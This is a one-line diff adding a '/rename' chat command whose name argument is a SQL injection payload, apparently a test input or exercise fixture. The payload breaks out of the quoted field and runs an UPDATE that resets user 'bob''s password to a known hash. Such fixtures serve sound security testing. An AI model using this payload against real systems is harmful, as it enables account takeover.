@@ -1,0 +1,1 @@
+/rename bob Bob Marmite' WHERE username = 'bob'; UPDATE users SET password = sha1('1234') WHERE username = 'bob'; --
